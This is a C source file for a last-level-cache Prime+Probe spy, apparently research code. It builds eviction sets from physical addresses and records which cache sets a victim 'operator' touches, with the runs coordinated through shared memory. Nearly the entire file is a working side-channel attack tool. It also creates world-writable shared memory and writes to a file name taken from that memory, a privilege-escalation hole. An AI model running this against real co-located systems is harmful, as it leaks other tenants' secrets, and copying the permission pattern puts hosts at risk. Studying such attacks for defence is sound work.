#define _GNU_SOURCE
#include "multihist.h"
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/sysinfo.h>
#include <time.h>
#include <unistd.h>
#include <immintrin.h> // _mm_pause

#include "cacheutils.h"

// Shared memory communication structures
struct shm_ctrl
{
    volatile int status;
    // 1: Attacker starting (initializing, building eviction sets)
    // 2: Ready / paused (not sampling, not saving)
    // 3: Sampling (accumulate to buffer)
    // 4: Save file and reset buffer, then go back to 2
    // 0: Exit
};

#define MAX_SAMPLES 1000000
typedef struct
{
    uint8_t accesses[64];
} sample_t;

struct shm_ctrl *sig = NULL;
char *shm_filename = NULL;

#define MAX_HIST 10000
#define EV_BUFFER 256 * 1024 * 1024
#define SLICES 8
#define EVSET_SIZE 96

#define ALDER_LAKE
#include "functions.h"

size_t measure(size_t addr)
{
    size_t start = rdtsc();
    maccess((void *)addr);
    return rdtsc() - start;
}

int compare_size_t(const void *a, const void *b)
{
    size_t aa = *(size_t *)a;
    size_t bb = *(size_t *)b;
    return (aa > bb) - (aa < bb);
}

int get_set(size_t paddr) { return (paddr >> 6) & 0xFFF; }

void prime(size_t *set, int len)
{
    for (int i = 0; i < len; i++)
    {
        maccess((void *)set[i]);
    }
    asm volatile("mfence");
}

// Probe: Measure average access time to eviction set
size_t probe(size_t *set, int len)
{
    size_t total = 0;
    for (int i = 0; i < len; i++)
    {
        size_t start = rdtsc();
        maccess((void *)set[i]);
        total += rdtsc() - start;
    }
    asm volatile("mfence");
    return total / len;
}

void evict(size_t *set, int len)
{
    for (int i = 0; i < len - 2; i++)
    {
        maccess((void *)set[i]);
        maccess((void *)set[i + 1]);
        maccess((void *)set[i]);
        maccess((void *)set[i + 1]);
        maccess((void *)set[i]);
        maccess((void *)set[i + 1]);
        maccess((void *)set[i]);
        maccess((void *)set[i + 1]);
        maccess((void *)set[i]);
        maccess((void *)set[i + 1]);
    }
}

// Calibrate a single eviction set's threshold
void calibrate_single_evset(size_t *evset, int evcnt, size_t *thrCached,
                            size_t *thrEvicted, size_t *threshold)
{
    const int SAMPLES = 500;
    size_t *timing_cached = malloc(SAMPLES * sizeof(size_t));
    size_t *timing_evicted = malloc(SAMPLES * sizeof(size_t));

    for (int i = 0; i < SAMPLES; i++)
    {
        prime(evset, evcnt);
        asm volatile("mfence");
        timing_cached[i] = probe(evset, evcnt);

        for (int j = 0; j < evcnt; j++)
        {
            flush((void *)evset[j]);
        }
        asm volatile("mfence");
        timing_evicted[i] = probe(evset, evcnt);
    }

    qsort(timing_cached, SAMPLES, sizeof(size_t), compare_size_t);
    qsort(timing_evicted, SAMPLES, sizeof(size_t), compare_size_t);

    *thrCached = timing_cached[SAMPLES / 2];
    *thrEvicted = timing_evicted[SAMPLES / 2];
    *threshold = (2 * (*thrEvicted) + (*thrCached)) / 3;

    free(timing_cached);
    free(timing_evicted);
}

// Calibrate threshold by measuring a single address (not entire eviction set)
void calibrate_threshold_single_address(size_t *evset, int evcnt,
                                        size_t *thrCached, size_t *thrEvicted,
                                        size_t *threshold)
{
    const int SAMPLES = 1000;
    size_t *timing_cached = malloc(SAMPLES * sizeof(size_t));
    size_t *timing_evicted = malloc(SAMPLES * sizeof(size_t));

    size_t test_addr = evset[0];

    for (int i = 0; i < SAMPLES; i++)
    {
        // Cached state: access twice to ensure in cache
        maccess((void *)test_addr);
        maccess((void *)test_addr);
        asm volatile("mfence");
        timing_cached[i] = measure(test_addr);

        // Flushed state
        flush((void *)test_addr);
        asm volatile("mfence");
        timing_evicted[i] = measure(test_addr);
    }

    qsort(timing_cached, SAMPLES, sizeof(size_t), compare_size_t);
    qsort(timing_evicted, SAMPLES, sizeof(size_t), compare_size_t);

    *thrCached = timing_cached[SAMPLES / 2];
    *thrEvicted = timing_evicted[SAMPLES / 2];
    *threshold = (*thrCached + *thrEvicted) / 2;

    free(timing_cached);
    free(timing_evicted);
}

// Dynamic threshold calibration using actual probe() function
size_t calibrate_dynamic_threshold(size_t evsets[64][EVSET_SIZE],
                                   int evcnt[64])
{
    const int WARMUP_SAMPLES = 300;
    size_t *samples = malloc(WARMUP_SAMPLES * sizeof(size_t));

    printf("Collecting %d baseline samples...\n", WARMUP_SAMPLES);

    for (int i = 0; i < WARMUP_SAMPLES; i++)
    {
        // Prime all sets
        for (int s = 0; s < 64; s++)
            prime(evsets[s], evcnt[s]);
        usleep(100); // Short interval

        // Probe all sets and record average
        size_t total = 0;
        for (int s = 0; s < 64; s++)
            total += probe(evsets[s], evcnt[s]);
        samples[i] = total / 64;
    }

    // Sort and find percentiles
    qsort(samples, WARMUP_SAMPLES, sizeof(size_t), compare_size_t);

    size_t p50 = samples[WARMUP_SAMPLES / 2];        // Median
    size_t p90 = samples[WARMUP_SAMPLES * 90 / 100]; // 90th percentile
    size_t p99 = samples[WARMUP_SAMPLES * 99 / 100]; // 99th percentile

    printf("Baseline statistics:\n");
    printf("  Median (p50): %zu cycles\n", p50);
    printf("  p90:          %zu cycles\n", p90);
    printf("  p99:          %zu cycles\n", p99);

    size_t threshold = p90 + (p90 - p50) / 2;

    free(samples);
    return threshold;
}

int main(int argc, char *argv[])
{
    printf("=== LLC Activity Matrix Monitoring System ===\n");

    // Pin to CPU core 0 for stable measurements
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(0, &cpuset);

    // Clean up old shared memory first (may have wrong permissions)
    shm_unlink("/llc_signal");
    shm_unlink("/llc_filename");

    // Initialize shared memory for communication
    int shm_fd = shm_open("/llc_signal", O_CREAT | O_RDWR, 0666);
    if (shm_fd < 0)
    {
        perror("shm_open /llc_signal failed");
        return 1;
    }
    ftruncate(shm_fd, 4096);
    fchmod(shm_fd, 0666);
    sig = (struct shm_ctrl *)mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
    if (sig == MAP_FAILED)
    {
        perror("mmap sig failed");
        return 1;
    }
    __atomic_store_n(&sig->status, 1, __ATOMIC_RELEASE); // Starting

    int fn_fd = shm_open("/llc_filename", O_CREAT | O_RDWR, 0666);
    if (fn_fd < 0)
    {
        perror("shm_open /llc_filename failed");
        return 1;
    }
    ftruncate(fn_fd, 1024);

    shm_filename = (char *)mmap(NULL, 1024, PROT_READ | PROT_WRITE, MAP_SHARED, fn_fd, 0);
    if (shm_filename == MAP_FAILED)
    {
        perror("mmap shm_filename failed");
        return 1;
    }
    memset(shm_filename, 0, 1024);

    printf("Shared memory initialized\n");

    // Initialize pagemap for physical address access
    init_pagemap();

    // Allocate eviction buffer and lock in physical memory to prevent swap
    char *eviction = malloc(EV_BUFFER);
    memset(eviction, 1, EV_BUFFER);
    if (mlock(eviction, EV_BUFFER) != 0)
    {
        perror("mlock failed (run as root or increase RLIMIT_MEMLOCK)");
        // Non-fatal: continue but eviction sets may be invalidated under memory pressure
    }

    // Randomly select starting cache set
    srand(time(NULL));
    int start_set = rand() % (4096 - 64);
    printf("Random start set: %d (monitoring sets %d to %d)\n", start_set,
           start_set, start_set + 63);

    // Build eviction sets for 64 consecutive cache sets
    size_t evsets[64][EVSET_SIZE];
    int evcnt[64];

    printf("\n=== Building Eviction Sets ===\n");
    for (int i = 0; i < 64; i++)
    {
        int target_set = start_set + i;
        evcnt[i] = 0;

        // printf("\r[%2d/64] Set %4d: ", i + 1, target_set);
        fflush(stdout);

        size_t candidate = (size_t)eviction;
        int iterations = 0;
        while (evcnt[i] < EVSET_SIZE && candidate < (size_t)eviction + EV_BUFFER)
        {
            size_t p = get_physical_address(candidate);
            if (get_set(p) == target_set)
            {
                evsets[i][evcnt[i]++] = candidate;
                if (evcnt[i] % 10 == 0)
                {
                    // printf("%d...", evcnt[i]);
                    fflush(stdout);
                }
            }
            candidate += 64;
            iterations++;

            // Debug: show progress every 100k iterations
            if (iterations % 100000 == 0)
            {
                // printf("[%dK iter, %d found]", iterations / 1000, evcnt[i]);
                fflush(stdout);
            }
        }
        // printf(" Found: %d\n", evcnt[i]);
    }

    // Dynamic threshold calibration
    printf("\n=== Dynamic Threshold Calibration ===\n");
    size_t threshold = calibrate_dynamic_threshold(evsets, evcnt);
    printf("\nDynamic threshold: %zu cycles\n", threshold);

    // Allocate sample buffer
    sample_t *buffer = malloc(sizeof(sample_t) * MAX_SAMPLES);
    int total_count = 0; // Accumulated sample count across multiple status=3 periods

    printf("\n=== Eviction sets built, entering state machine ===\n");
    printf("Monitoring cache sets %d to %d\n", start_set, start_set + 63);

    // Signal ready state
    __atomic_store_n(&sig->status, 2, __ATOMIC_RELEASE);
    printf("Status set to 2 (ready), waiting for command...\n");

    for (int noise = 0; noise < 3 && total_count < MAX_SAMPLES; noise++)
    {
        for (int i = 0; i < 64; i++)
            prime(evsets[i], evcnt[i]);

        for (int j = 0; j < 30; j++)
            _mm_pause();

        for (int i = 0; i < 64; i++)
        {
            size_t delay = probe(evsets[i], evcnt[i]);
            buffer[total_count].accesses[i] = (delay > threshold) ? 1 : 0;
        }
        total_count++;
    }

    // Main state machine loop
    while (1)
    {
        int current = __atomic_load_n(&sig->status, __ATOMIC_ACQUIRE);

        // Exit signal
        if (current == 0)
            break;

        // Save and reset signal
        if (current == 4)
        {
            printf("[Spy] Received save signal, collected %d total samples\n", total_count);

            // Save accumulated samples to file
            if (strlen(shm_filename) > 0 && total_count > 0)
            {
                printf("[Spy] Saving to %s...\n", shm_filename);
                FILE *f = fopen(shm_filename, "w");
                if (f)
                {
                    char write_buf[65536];
                    setvbuf(f, write_buf, _IOFBF, sizeof(write_buf));
                    for (int i = 0; i < total_count; i++)
                    {
                        for (int j = 0; j < 64; j++)
                            fprintf(f, "%d ", buffer[i].accesses[j]);
                        fprintf(f, "\n");
                    }
                    fclose(f);
                    printf("[Spy] Saved %d samples to %s\n", total_count, shm_filename);
                }
            }

            // Reset buffer for next operator
            total_count = 0;

            // Add initial noise samples after reset (same as startup)
            // This ensures total_count > 0 for the next operator
            for (int noise = 0; noise < 3 && total_count < MAX_SAMPLES; noise++)
            {
                for (int i = 0; i < 64; i++)
                    prime(evsets[i], evcnt[i]);

                for (int j = 0; j < 30; j++)
                    _mm_pause();

                for (int i = 0; i < 64; i++)
                {
                    size_t delay = probe(evsets[i], evcnt[i]);
                    buffer[total_count].accesses[i] = (delay > threshold) ? 1 : 0;
                }
                total_count++;
            }

            // Signal ready for next operator
            __atomic_store_n(&sig->status, 2, __ATOMIC_RELEASE);
            printf("[Spy] Reset complete, ready for next operator (status=2)\n");
            continue;
        }

        // Sampling state - accumulate samples
        if (current == 3)
        {
            // Sample until status changes (gdb sets status=2 after each finish)
            while (total_count < MAX_SAMPLES &&
                   __atomic_load_n(&sig->status, __ATOMIC_ACQUIRE) == 3)
            {
                // Prime all eviction sets
                for (int i = 0; i < 64; i++)
                    prime(evsets[i], evcnt[i]);

                // Wait for victim activity (increased from 30 to 1000)
                for (int j = 0; j < 1000; j++)
                    _mm_pause();

                // Probe all eviction sets and record
                for (int i = 0; i < 64; i++)
                {
                    size_t delay = probe(evsets[i], evcnt[i]);
                    buffer[total_count].accesses[i] = (delay > threshold) ? 1 : 0;
                }
                total_count++;
            }

            // Extra noise sampling: 3 samples after operator finishes
            // These samples are taken when no operator is running,
            // producing different cache patterns that serve as separators
            for (int noise = 0; noise < 3 && total_count < MAX_SAMPLES; noise++)
            {
                for (int i = 0; i < 64; i++)
                    prime(evsets[i], evcnt[i]);

                for (int j = 0; j < 30; j++)
                    _mm_pause();

                for (int i = 0; i < 64; i++)
                {
                    size_t delay = probe(evsets[i], evcnt[i]);
                    buffer[total_count].accesses[i] = (delay > threshold) ? 1 : 0;
                }
                total_count++;
            }
            continue;
        }

        // status=2: just wait
        _mm_pause();
    }

    // Cleanup
    free(buffer);
    free(eviction);
    munmap(sig, 4096);
    munmap(shm_filename, 1024);
    shm_unlink("/llc_signal");
    shm_unlink("/llc_filename");
    cleanup_pagemap();

    printf("Cleanup complete, exiting.\n");
    return 0;
}
